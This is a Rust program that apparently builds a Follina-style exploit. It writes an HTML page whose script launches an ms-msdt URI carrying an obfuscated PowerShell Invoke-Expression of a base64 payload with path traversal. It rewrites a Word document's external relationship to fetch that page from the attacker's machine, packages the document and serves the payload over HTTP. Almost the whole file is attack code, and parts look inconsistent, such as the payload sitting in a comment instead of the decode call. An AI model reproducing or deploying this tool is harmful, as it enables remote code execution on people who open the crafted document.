use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use rand::{thread_rng, Rng};
use std::iter;
use base64;
use std::fs::create_dir_all;
use std::io::{Read, Write};
use walkdir;
use zip;
use std::fs::File;

fn main() {
    // Stage 1: Document Crafting
    let serve_host = match env::args().nth(1) {
        Some(host) => host,
        None => {
            eprintln!("[!] Error determining HTTP hosting address. Did you provide an interface or IP?");
            std::process::exit(1);
        }
    };

    // Stage 2: Secondary Payload Retrieval
    let mut payload = String::new();
    let mut rng = thread_rng();
    let dist = rand::distributions::Uniform::from('a'..'z');
    payload += &iter::repeat_with(|| rng.sample(dist))
        .take(4096)
        .collect::<String>();
    payload.push_str("\n</script>");

    let base64_payload = base64::encode(&payload);

    // Stage 3: PowerShell Execution
    let html_payload = format!(
        r#"<script>
        /*
        '{}'
        */
        
        
        window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+[char]34+'))))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\";</script>"#,
        base64_payload
    );
   
    // Specify the location where you want to save the HTML document
    let html_folder = PathBuf::from("/home/gohilmukund/recreation/rust/");

    // Save the HTML document to the specified folder
    let html_file_path = html_folder.join("index.html");
    fs::write(&html_file_path, &html_payload)
        .expect("[!] Failed to write index.html");

    // DOCX manipulation
    // Save the crafted DOCX file with a specified or default name
    let docx_name = env::args().nth(2).unwrap_or_else(|| "follina.doc".to_string());
    let _docx_path = Path::new("/home/gohilmukund/recreation/rust").join(docx_name.clone());
    generate_docx(docx_name, "/home/gohilmukund/recreation/rust");

    // Start HTTP server and serve files
    start_http_server(&html_folder, &serve_host);
}

fn start_http_server(serve_path: &Path, serve_host: &str) {
    let server = tiny_http::Server::http(format!("{}:8000", serve_host)).unwrap();
    println!("[+] Serving HTML payload on {}:8000", serve_host);

    for request in server.incoming_requests() {
        let response = match File::open(serve_path.join("index.html")) {
            Ok(mut file) => {
                let mut content = Vec::new();
                file.read_to_end(&mut content).unwrap();
                tiny_http::Response::from_data(content)
            }
            Err(_) => {
                // Handle the case when the file cannot be opened
                let content = b"Not Found";
                tiny_http::Response::from_data(content.to_vec())
                    .with_status_code(404) // Using the status code directly
            }
        };
        let _ = request.respond(response);
    }
}

fn parse_ip_address(ifconfig_output: &str) -> String {
    // Parse the output to find the IP address
    // You may need to implement a proper parsing logic based on your specific output format
    // Here's a simple example:
    ifconfig_output
        .lines()
        .filter_map(|line| {
            if line.trim().starts_with("inet ") {
                Some(line.trim().split_whitespace().nth(1).unwrap().to_string())
            } else {
                None
            }
        })
        .next()
        .unwrap_or_else(|| {
            eprintln!("Failed to parse IP address from ifconfig output");
            std::process::exit(1);
        })
}


fn generate_docx(docx_name: String, webroot: &str) {
    let docx_filename = format!("{}/{}", webroot, docx_name);
    let docx_dir = Path::new(&docx_filename).parent().unwrap();

    // Ensure the directory exists or create it
    if !docx_dir.exists() {
        create_dir_all(docx_dir).expect("Failed to create directory");
    }

    // Construct the path to document.xml.rels file
    let document_rels_path = docx_dir.join("doc").join("word").join("_rels").join("document.xml.rels");

    // Read the content of document.xml.rels file
    let mut external_referral = fs::read_to_string(&document_rels_path)
        .expect("Failed to read document.xml.rels");

    // Retrieve the IP address from the output of ifconfig command
let ip_addr_output = Command::new("ifconfig")
    .output()
    .expect("failed to execute `ifconfig`");

// Extract IP address from the output
let stdout = String::from_utf8_lossy(&ip_addr_output.stdout);
let ip_addr = parse_ip_address(&stdout);

// Use the extracted IP address for formatting
external_referral = external_referral.replace("{staged_html}", &format!("http://{}:8000/index.html", ip_addr));

    // Write the modified content back to document.xml.rels file
    fs::write(&document_rels_path, external_referral)
        .expect("Failed to write to document.xml.rels");

    // Create the DOCX file
    create_docx(&docx_filename);
}


fn create_docx(docx_name: &str) {
    let src_dir = "doc/";
    let method = Some(zip::CompressionMethod::Deflated);
    match doit(src_dir, docx_name, method.unwrap()) {
        Ok(_) => println!("Created {}", docx_name),
        Err(e) => println!("Error: {:?}", e),
    }
}

fn doit(
    src_dir: &str,
    dst_file: &str,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()> {
    if !Path::new(src_dir).is_dir() {
        return Err(zip::result::ZipError::FileNotFound);
    }

    let path = Path::new(dst_file);
    let file = fs::File::create(&path).unwrap();

    let walkdir = walkdir::WalkDir::new(src_dir);
    let it = walkdir.into_iter();

    zip_dir(&mut it.filter_map(|e| e.ok()), src_dir, file, method)?;

    Ok(())
}

fn zip_dir<T>(
    it: &mut dyn Iterator<Item = walkdir::DirEntry>,
    prefix: &str,
    writer: T,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()>
where
    T: std::io::Write + std::io::Seek,
{
    let mut zip = zip::ZipWriter::new(writer);
    let options = zip::write::FileOptions::default()
        .compression_method(method)
        .unix_permissions(0o755);

    let mut buffer = Vec::new();
    for entry in it {
        let path = entry.path();
        let name = path.strip_prefix(Path::new(prefix)).unwrap();

        // Write file or directory explicitly
        // Some unzip tools unzip files with directory paths correctly, some do not!
        if path.is_file() {
            zip.start_file(name.to_string_lossy().into_owned(), options)?;
            let mut f = fs::File::open(path)?;

            f.read_to_end(&mut buffer)?;
            zip.write_all(&buffer)?;
            buffer.clear();
        } else if !name.as_os_str().is_empty() {
                    // Only if not root! Avoids path spec / warning
        // and mapname conversion failed error on unzip
        zip.add_directory(name.to_string_lossy().into_owned(), options)?;
        }
    }
    zip.finish()?;
    Ok(())
}

